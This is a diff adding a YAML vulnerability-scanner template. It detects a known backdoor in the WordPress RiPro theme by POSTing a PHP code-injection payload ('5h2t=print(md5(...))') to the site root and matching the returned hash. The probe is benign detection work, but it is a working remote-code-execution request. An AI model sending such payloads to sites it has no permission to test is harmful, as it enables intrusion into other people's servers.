@@ -1,0 +1,31 @@
+id: poc-local-cms-wordpress-themes-ripro-backdoor
+
+info:
+  name: poc-local-cms-wordpress-themes-ripro-backdoor
+  author: capiton
+  severity: critical
+  tags: wordpress,php,ripro
+
+variables:
+  rand1: "{{rand_int(10000000, 20000000)}}"
+  md5_rand1: "{{md5(rand1)}}"
+
+requests:
+  - method: POST
+    path:
+      - "{{RootURL}}"
+    headers:
+      X-Requested-With: XMLHttpRequest
+    body: "5h2t=print(md5({{rand1}}));"
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "{{md5_rand1}}"
+        condition: and
+        part: body
+
